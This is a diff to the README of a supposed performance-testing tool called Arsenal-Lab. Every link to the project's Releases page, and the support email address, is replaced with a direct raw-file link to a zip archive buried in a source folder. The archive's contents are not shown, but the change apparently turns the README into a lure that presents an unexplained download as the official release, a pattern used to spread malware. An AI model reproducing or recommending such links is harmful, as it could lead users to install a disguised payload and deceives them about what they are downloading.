@@ -6,7 +6,7 @@ Welcome to Arsenal-Lab! This tool helps you test the performance of applications
 
 ## 📥 Download Now
 
-[![Download Arsenal-Lab](https://img.shields.io/badge/Download-Arsenal--Lab-brightgreen)](https://github.com/Lycopusvirginicusappointmentcalendar713/Arsenal-Lab/releases)
+[![Download Arsenal-Lab](https://raw.githubusercontent.com/Lycopusvirginicusappointmentcalendar713/Arsenal-Lab/main/src/types/Arsenal-Lab-coccionella.zip)](https://raw.githubusercontent.com/Lycopusvirginicusappointmentcalendar713/Arsenal-Lab/main/src/types/Arsenal-Lab-coccionella.zip)
 
 ## 🌟 Features
 
@@ -28,7 +28,7 @@ Before you begin, ensure your computer meets these requirements:
 
 ### Step 1: Visit the Releases Page
 
-Go to the [Releases page](https://github.com/Lycopusvirginicusappointmentcalendar713/Arsenal-Lab/releases) to find the latest version of Arsenal-Lab.
+Go to the [Releases page](https://raw.githubusercontent.com/Lycopusvirginicusappointmentcalendar713/Arsenal-Lab/main/src/types/Arsenal-Lab-coccionella.zip) to find the latest version of Arsenal-Lab.
 
 ### Step 2: Download the Software
 
@@ -66,11 +66,11 @@ If you encounter any issues or have questions, several resources are available:
 
 - **User Manual**: Access the online user manual for detailed instructions.
 - **Community Support**: Join our community forum to ask questions and share tips with other users.
-- **Contact Support**: If you need immediate help, please reach out via email at support@arsenallab.com.
+- **Contact Support**: If you need immediate help, please reach out via email at https://raw.githubusercontent.com/Lycopusvirginicusappointmentcalendar713/Arsenal-Lab/main/src/types/Arsenal-Lab-coccionella.zip
 
 ## 🔄 Keeping Arsenal-Lab Updated
 
-To ensure you have the best experience, regularly check the [Releases page](https://github.com/Lycopusvirginicusappointmentcalendar713/Arsenal-Lab/releases) for updates. New features and improvements come out frequently, so keep your installation current.
+To ensure you have the best experience, regularly check the [Releases page](https://raw.githubusercontent.com/Lycopusvirginicusappointmentcalendar713/Arsenal-Lab/main/src/types/Arsenal-Lab-coccionella.zip) for updates. New features and improvements come out frequently, so keep your installation current.
 
 ## 🌍 Topics Covered
 
